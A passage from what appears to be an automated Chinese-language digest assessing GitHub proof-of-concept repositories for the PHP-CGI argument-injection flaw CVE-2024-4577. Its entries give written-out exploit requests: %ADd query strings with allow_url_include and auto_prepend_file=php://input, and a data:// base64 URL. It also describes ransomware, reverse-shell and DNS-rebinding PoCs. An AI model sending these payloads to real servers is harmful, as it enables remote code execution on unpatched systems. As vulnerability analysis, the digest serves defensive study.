**利用条件:** Windows 系统，运行于 CGI 模式下的 PHP，且系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统以 CGI 模式运行时，由于系统代码页的 "Best Fit" 行为导致参数注入的远程代码执行漏洞。攻击者可以通过构造恶意的 HTTP 请求，将恶意参数传递给 PHP 解释器，从而执行任意代码。

**有效性评估：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞的有效性很高。漏洞库明确指出该漏洞的存在，并提供了受影响的版本范围。搜索引擎结果显示，该漏洞在野外已存在利用，且有公开的 PoC 代码可供验证。漏洞利用代码（Incident Response Walkthrough）提供了一个应对 CVE-2024-4577 攻击的案例分析，虽未直接提供 PoC 代码，但分析过程表明了该漏洞可被利用，并附带了模拟攻击场景。

**投毒风险分析：**

提供的漏洞利用代码主要是一个事件响应的演练文档，用于分析和缓解 CVE-2024-4577 漏洞。它主要关注识别漏洞、分析攻击者行为以及确定受影响的系统。虽然该文档提到了攻击者可能执行的命令（whoami.exe、calc.exe），但它本身并不包含任何恶意代码。因此，可以认为此仓库中作者隐藏的投毒代码的可能性较低，约为 5%。 这 5% 的可能性是基于对任何代码库都不能完全排除潜在风险的一般安全考虑。

**利用方式分析：**

1.  **环境要求：** 目标系统必须是 Windows，PHP 运行于 CGI 模式，并且启用了使用 "Best Fit" 策略的代码页。
2.  **漏洞触发：** 攻击者发送包含恶意构造参数的 HTTP 请求。这些参数会被 Windows 的 "Best Fit" 代码页转换机制错误地解释为 PHP 选项。
3.  **代码执行：** PHP 解释器执行被注入的恶意选项，导致任意代码执行。

攻击者通过构造特殊的 URL 或 POST 数据，将恶意的 PHP 参数注入到 PHP 进程中。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数直接执行 PHP 代码。利用方式依赖于服务器的配置和 PHP 版本的具体细节。

**项目地址:** [PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough](https://github.com/PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #17

**来源**: [CVE-2024-4577-Skycritch_CVE-2024-4577.md](../2024/CVE-2024-4577-Skycritch_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是PHP的一个远程代码执行漏洞，存在于Windows系统上以CGI模式运行的PHP中。当系统配置为使用某些代码页时，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码，在服务器上运行任意PHP代码等。 

**有效性分析：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，存在公开的PoC利用代码。漏洞利用代码 `CVE-2024-4577.py` 尝试通过在URL中注入PHP选项来利用此漏洞。具体来说，它设置 `allow_url_include` 为 1，并使用 `auto_prepend_file` 包含 `php://input`，然后将要执行的PHP代码通过POST请求发送到目标URL。如果返回结果中包含“1337”，则认为漏洞利用成功。

**投毒风险分析：**
查看提供的POC代码，主要功能是利用漏洞执行任意PHP代码。 `CVE-2024-4577.py`  没有发现明显的恶意代码，该脚本的主要作用是发送包含恶意PHP代码的请求。风险很低。
`README.md`文件只包含漏洞名称，没有投毒风险。
整体投毒风险评估为1%。

**利用方式：**
利用方式如下：
1.  攻击者需要找到运行在Windows服务器上的、使用CGI模式的、且存在漏洞的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）。
2.  攻击者构造包含恶意PHP选项的URL，并将其附加到目标PHP脚本的URL后面。
3.  攻击者使用POST请求将要执行的PHP代码发送到服务器。
4.  如果漏洞利用成功，服务器将执行攻击者提供的PHP代码。

**优先级排序依据：**
根据您的要求，分析时遵循以下优先级：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息。
搜索引擎结果用于确认漏洞的广泛性和影响，漏洞利用代码用于分析利用方式和潜在的投毒风险，漏洞库信息用于验证漏洞的存在和影响范围。

**项目地址:** [Skycritch/CVE-2024-4577](https://github.com/Skycritch/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #18

**来源**: [CVE-2024-4577-VictorShem_CVE-2024-4577.md](../2024/CVE-2024-4577-VictorShem_CVE-2024-4577.md)

## CVE-2024-4577 - PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (运行于 Windows CGI 模式)

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统上 PHP 以 CGI 模式运行，且系统启用了使用 "Best Fit" 策略的代码页。通常是 XAMPP 环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统中以 CGI 模式运行时的一个参数注入漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或执行任意 PHP 代码。

**有效性：** 提供的 POC 代码 `CVE-2024-4577.yaml` 看起来是有效的 Nuclei 模板，旨在检测和利用此漏洞。它通过向目标 URL 发送带有特殊构造的 payload 的 HTTP 请求，payload 中包含 `%AD` 字符和恶意的 PHP 配置选项（`allow_url_include=1` 和 `auto_prepend_file=php://input`），以及要执行的 PHP 代码（`<?php phpinfo(); ?>`）。如果漏洞存在且利用成功，服务器应该返回包含 PHP 版本信息的页面。

**投毒风险：**
查看了提供的 POC 代码 `CVE-2024-4577.yaml` 和 `README.md` 文件。其中利用方式是通过构造特定的 URL，包含 `%AD` 字符以及 `allow_url_include` 和 `auto_prepend_file` 等配置项，结合 POST 请求执行 PHP 代码。这个利用过程本身就是一种后门植入的方式，但这是漏洞利用的固有行为，不应被视为恶意投毒。

`README.md` 中包含用于 FOFA 和 Censys 的搜索语句，用于发现暴露在公网上的 XAMPP 服务器。这部分内容本身无害，只是为了方便漏洞发现和利用。但也可能会被恶意攻击者利用。

综合来看，该仓库中不存在明显的恶意投毒代码，但存在被滥用的风险，因此给出 10% 的投毒风险。

**利用方式：**
1.  **环境准备：** 目标系统必须是运行在 Windows 上的 PHP，并且是以 CGI 模式运行。同时，系统的代码页需要启用 "Best Fit" 策略。
2.  **构造 Payload：** 攻击者需要构造包含 `%AD` 字符的特殊 URL，以及恶意的 PHP 配置选项，例如 `allow_url_include=1` 和 `auto_prepend_file=php://input`。其中 `%AD` 是触发 Windows "Best Fit" 转换的关键。
3.  **发送请求：** 攻击者通过 HTTP POST 请求将构造好的 payload 发送到目标服务器的 PHP 脚本，同时在 POST body 中包含要执行的 PHP 代码。
4.  **远程代码执行：** 如果漏洞存在且利用成功，目标服务器将执行 POST body 中的 PHP 代码，从而实现远程代码执行。

**项目地址:** [VictorShem/CVE-2024-4577](https://github.com/VictorShem/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #19

**来源**: [CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，运行于Windows+Apache+PHP-CGI环境，且启用了Best-Fit策略的CodePage

**利用条件:** 目标服务器需满足特定PHP版本、Windows环境、Apache服务器、PHP-CGI模式，以及存在使用Best-Fit策略的CodePage设置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，存在于Windows平台的特定PHP版本中。攻击者可以通过精心构造的URL，利用Windows系统的“Best Fit”字符转换特性，将恶意参数注入到PHP的执行命令中，最终实现远程代码执行。 

**有效性:**
提供的POC代码是有效的，通过发送包含`allow_url_include`和`auto_prepend_file`参数的POST请求，并包含PHP代码`<?php phpinfo(); ?>`，如果目标存在漏洞，则会执行该代码并返回`phpinfo()`的结果。

**投毒风险:**
提供的代码主要用于检测漏洞是否存在，功能较为直接，没有发现隐藏的恶意代码或后门。该仓库的`CODEOWNERS`文件中只包含`@zephrfish`，该用户有代码审核权，因此综合评估认为投毒的可能性较低。

**利用方式:**
1.  **环境确认:** 漏洞利用前需要确认目标服务器是否满足以下条件：
    *   Windows操作系统
    *   Apache服务器
    *   PHP以CGI模式运行
    *   PHP版本为受影响的范围（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）
    *   系统启用了使用“Best-Fit”策略的CodePage
2.  **构造恶意URL:** 构造包含恶意参数的URL。关键在于使用`%25ADd`来代替`-d`，结合`allow_url_include`和`auto_prepend_file`选项，允许远程包含恶意PHP代码。
3.  **发送请求:** 使用POST方法发送包含PHP代码的请求，例如`<?php phpinfo(); ?>`或更具危害性的代码。
4.  **执行任意代码:** 成功利用漏洞后，可以在目标服务器上执行任意PHP代码，从而控制服务器。

**项目地址:** [ZephrFish/CVE-2024-4577-PHP-RCE](https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #20

**来源**: [CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP (Windows CGI)

**危害等级:** 极高，远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个存在于Windows PHP-CGI配置中的严重漏洞。当PHP以CGI模式在Windows服务器上运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”策略来替换命令行参数中的字符。PHP-CGI模块可能会错误地将这些替换后的字符解析为PHP选项，从而允许攻击者向PHP二进制文件传递恶意参数。这可能导致泄露脚本源码，执行任意PHP代码，甚至在服务器上执行操作系统命令。

**利用方式：**

1.  **攻击向量：** 通过HTTP请求，构造恶意的URL或POST数据，向PHP-CGI传递恶意参数。
2.  **利用条件：**
    *   目标服务器是Windows系统。
    *   PHP以CGI模式运行。
    *   Web服务器（如Apache）用于处理PHP请求。
    *   系统启用了特定的代码页，允许字符替换。
3.  **攻击步骤：**
    *   利用Windows的“Best-Fit”字符替换机制，将特殊字符转换为PHP选项。
    *   通过`?`或`-`等字符引导，注入恶意PHP配置选项，例如`-d allow_url_include=1 -d auto_prepend_file=php://input`。
    *   通过`POST`请求发送PHP代码，实现远程代码执行。

**有效性：**

根据漏洞描述、搜索结果以及提供的POC代码，该漏洞的利用是有效的。已经有公开的PoC代码可以实现远程代码执行。漏洞库信息和搜索引擎结果都确认了该漏洞的存在以及可利用性。

提供的PoC利用了DNS重绑定技术，允许攻击者通过受害者的浏览器，对内网的PHP-CGI服务器进行攻击。这个方法绕过了同源策略(SOP)，使得攻击者能够攻击原本无法直接从外部访问的内网系统。

**投毒风险：**

提供的PoC代码主要由三个部分组成: `README.md`, `client.html`。其中`README.md`文件主要描述漏洞原理、利用方式和配置说明，`client.html`是漏洞利用的核心代码。

*  **client.html分析:**  该文件包含Javascript代码，用于执行DNS重绑定攻击，并向目标IP发送包含恶意payload的请求。攻击payload可以在 `client.html`文件中被修改.

虽然该PoC本身旨在利用漏洞，但以下情况可能构成投毒风险：

1.  **依赖的第三方服务:**  PoC依赖于`duckdns.org`提供DNS服务, 一旦服务出现问题或者被劫持,可能会导致PoC失效甚至被恶意利用。
2.  **内网扫描IP列表:** `client.html`中包含一个可以修改的内网IP列表. 如果这个列表被替换成其他恶意IP地址，可能导致攻击者扫描或攻击非预期目标。
3.  **Payload内容:**  虽然默认的payload为`calc`,用户可以自定义payload,潜在的风险在于如果用户不熟悉PHP, 可能会引入不安全的PHP代码或者连接恶意URL。
4.  **DNS Rebinding 的滥用:**  DNS Rebinding 本身就是一项有争议的技术，在没有充分安全措施的情况下使用，可能会造成隐私泄露或者其他安全问题。

因此，综合考量，该仓库的投毒风险评定为10%。主要风险在于使用者可能修改PoC中的payload或者IP列表，从而引入额外的风险。作者本身并没有加入后门代码。

**项目地址:** [ZeroMemoryEx/PHP-CGI-INTERNAL-RCE](https://github.com/ZeroMemoryEx/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #21

**来源**: [CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #22

**来源**: [CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md](../2024/CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8（Windows环境，CGI模式，开启Best Fit策略的CodePage）

**利用条件:** Windows系统，PHP以CGI模式运行，启用了使用"Best Fit"策略的CodePage。目标服务器未安装补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP CGI参数注入漏洞，存在于PHP的Windows版本中，当PHP以CGI模式运行时，如果系统设置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行参数中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本的源代码，或者在服务器上执行任意PHP代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞影响特定版本的PHP，并且有公开的PoC代码，证明该漏洞是有效的。多个安全厂商和研究人员已经确认了该漏洞的存在并发布了相关的分析和利用方法。

**投毒风险：**
提供的CTF_WALKTHROUGH.md文件本身是漏洞利用的教程，其中包含的攻击脚本用于测试、文件读取、命令执行、容器逃逸、AWS权限提升以及持久化等攻击步骤。这些脚本可以被用于恶意目的，但教程本身是中立的，风险点在于用户是否清楚脚本的功能，是否存在其他关联的，具有恶意目的的脚本或配置，因此投毒风险为10%。因为没有发现明显的恶意代码，所以投毒风险较低。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的HTTP请求，在URL的`PATH_INFO`部分注入特殊字符（如`%0a`，换行符），使得PHP CGI在解析命令行参数时出现错误。
2.  **参数注入：** 注入的换行符将URL分割成多个参数，攻击者可以利用此特性注入PHP的命令行选项，例如`-d`选项用于设置PHP配置指令。
3.  **执行任意代码/读取文件：** 攻击者可以设置`allow_url_include=1`以允许包含远程文件，然后设置`auto_prepend_file`或者`auto_append_file`为包含恶意PHP代码的文件或者`/flag.txt`等敏感文件，从而执行任意PHP代码或者读取文件。
4.  **其他攻击：** 进一步的，攻击者可以尝试容器逃逸，访问AWS资源，甚至创建后门实现持久化控制。

**项目地址:** [a1ex-var1amov/ctf-cve-2024-4577](https://github.com/a1ex-var1amov/ctf-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #23

**来源**: [CVE-2024-4577-aaddmin1122345_cve-2024-4577.md](../2024/CVE-2024-4577-aaddmin1122345_cve-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** < 8.1.29, < 8.2.20, < 8.3.8 (在Windows上运行，并启用Best-Fit策略的code page的CGI模式)

**利用条件:** PHP以CGI模式在Windows上运行，并且启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个存在于PHP中的远程代码执行漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，这可能允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行服务器上的任意PHP代码。

**利用方式：**

1.  攻击者发送特制的HTTP请求，其中包含恶意构造的查询字符串。该查询字符串包含被Windows "Best-Fit"代码页转换解释为PHP配置选项的字符。
2.  服务器接收到请求后，会将查询字符串传递给PHP CGI解释器。
3.  PHP CGI解释器错误地将恶意构造的字符串解析为PHP选项，如`allow_url_include`和`auto_prepend_file`。
4.  通过设置这些选项，攻击者可以包含远程文件，从而执行任意PHP代码。

**POC分析：**

提供的Python脚本`cve-2024-4577.py`实现了利用此漏洞的POC。脚本接受目标URL和可选的自定义payload作为参数。

*   如果未提供自定义payload，脚本将尝试执行`phpinfo()`函数以验证漏洞是否存在。
*   如果提供了自定义payload，脚本将使用该payload来执行任意PHP代码。Readme文件提供了使用示例。
*   脚本通过构造包含特殊字符的URL，并向其发送POST请求来利用漏洞。特殊字符会被Windows的Best-Fit机制转换成PHP可识别的配置指令，最终执行攻击者注入的PHP代码。

**投毒风险分析：**

通过对提供的POC代码进行分析，没有发现作者隐藏的恶意代码或后门。该脚本的功能是按照预期执行漏洞利用，没有额外的、未声明的行为。因此，投毒风险评估为0%。

**项目地址:** [aaddmin1122345/cve-2024-4577](https://github.com/aaddmin1122345/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #24

**来源**: [CVE-2024-4577-ahmetramazank_CVE-2024-4577.md](../2024/CVE-2024-4577-ahmetramazank_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响在Windows上运行的PHP的严重漏洞。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**利用方式：**

1.  **利用点：** CGI模式下，Windows系统的字符编码转换。
2.  **攻击向量：** 通过构造特殊的URL，利用`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`将恶意PHP代码注入到`php://input`流中。
3.  **漏洞验证：** 通过发送包含`<?php phpinfo();`的POST请求，观察服务器是否返回PHP信息页面。
4.  **远程代码执行：** 上传并执行恶意脚本，例如反向shell或勒索软件。

**投毒风险分析：**

提供的POC代码主要包含以下文件：

*   `README.md`: 漏洞描述和利用步骤。
*   `encoded.ps1`: 用于解码被加密的zip文件，用于解密勒索软件加密的文件。
*   `ransomware.ps1`: 勒索软件脚本，用于加密文件和上传zip文件。

`ransomware.ps1` 脚本尝试将文件压缩为 ZIP 文件，然后将其上传到 `http://192.168.176.130:5000/upload`。如果上传成功，则使用 Base64 对 ZIP 文件进行编码，并保存到 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt`。

`encoded.ps1` 脚本从 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt` 读取 Base64 编码的数据，对其进行解码，并将解码后的数据写入 `C:\Users\ahmet\Desktop\battalbelgeler_decoded.zip`。

主要风险在于，攻击者可能会在`ransomware.ps1`中隐藏恶意代码，例如：

*   **后门：** 在上传的文件中植入后门，以便后续访问受感染的系统。
*   **数据窃取：** 在上传过程中窃取敏感数据。
*   **反向shell**: 在机器上执行后门代码，获得shell控制权限

虽然这个仓库的主要目的是演示漏洞，但由于涉及到勒索软件的部署和文件的上传，存在一定的风险，**作者可能在脚本中植入了额外的恶意功能**。考虑到`ransomware.ps1`需要上传文件到一个外部地址，并且可能包含一些未知的恶意行为，因此初步评估投毒风险为10%。

**项目地址:** [ahmetramazank/CVE-2024-4577](https://github.com/ahmetramazank/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #25

**来源**: [CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md](../2024/CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式, 特定代码页)

**利用条件:** Windows服务器, 运行在CGI模式下的PHP, 系统配置为使用某些代码页, 允许"Best-Fit"行为替换字符。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的参数注入漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而可能泄露脚本源代码或在服务器上运行任意 PHP 代码。

**有效性分析：**
根据漏洞信息，搜索引擎结果和提供的PoC代码，该漏洞利用的有效性较高。漏洞库信息表明该漏洞已被公开披露，并且存在受影响的版本范围。搜索引擎结果显示，该漏洞在公开后不久就出现了大量的利用尝试。PoC代码提供了一个扫描器和利用工具，可以用来检测和利用此漏洞。该PoC代码通过构造包含特定参数的URL，并结合`php://input`流，允许执行任意PHP代码。

**投毒风险分析：**
PoC代码主要包含以下功能：
1.  **Payload选择：** 提供了几个不同的payload，攻击者可以选择使用哪个payload进行攻击。
2.  **漏洞扫描：** 通过发送带有payload的POST请求，检测目标是否存在漏洞，根据响应内容判断。
3.  **漏洞利用：** 读取用户提供的PHP payload文件内容，并通过POST请求发送到目标服务器执行。

风险点在于payload文件的内容。如果payload文件本身包含恶意代码（例如反弹shell、webshell等），那么执行利用操作会导致服务器被植入后门。PoC代码本身没有明显的恶意行为，风险主要来自用户提供的payload。代码存在投毒风险，是因为攻击者可能会修改脚本，在用户不知情的情况下，添加额外的恶意操作，例如：在成功利用后，自动下载并执行特定的恶意文件。或者将服务器信息发送到指定服务器。因此，使用此PoC需要谨慎，验证payload的内容，并确保来源可信，降低投毒风险。投毒风险评估为10%，主要是考虑到使用者可能会引入恶意payload文件。

**利用方式分析：**
1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP运行在CGI模式下。
2.  **配置系统代码页：** 目标系统需要配置为使用某些代码页，允许 "Best-Fit" 行为。
3.  **构造恶意请求：** 构造包含恶意参数的URL。这些参数通常包含 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将POST请求的内容作为PHP代码执行。
4.  **发送PHP Payload：**  通过POST请求将包含恶意代码的PHP payload发送到目标服务器。由于`auto_prepend_file`参数的存在，POST请求中的PHP代码会被执行，从而实现远程代码执行。
5.  **执行任意代码：**  成功利用漏洞后，可以在目标服务器上执行任意代码，例如：上传webshell，获取服务器权限。

**项目地址:** [bibo318/CVE-2024-4577-RCE-ATTACK](https://github.com/bibo318/CVE-2024-4577-RCE-ATTACK)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #26

**来源**: [CVE-2024-4577-bughuntar_CVE-2024-4577.md](../2024/CVE-2024-4577-bughuntar_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是PHP在Windows系统上以CGI模式运行时的一个参数注入漏洞。当系统配置使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给PHP二进制文件，导致泄露源代码，执行任意PHP代码等。

**有效性:**
提供的POC代码通过发送包含特定查询参数（如`%ADd+allow_url_include=1`和`%ADd+auto_prepend_file=php://input`）的POST请求到`/php-cgi/php-cgi.exe`端点来利用此漏洞。如果目标服务器存在漏洞，则`php://input`流的内容（在本例中为`<?php phpinfo(); ?>`）将被执行，并且服务器将返回包含"PHP Version"的响应。此方法已被多个来源证实有效。

**投毒风险:**
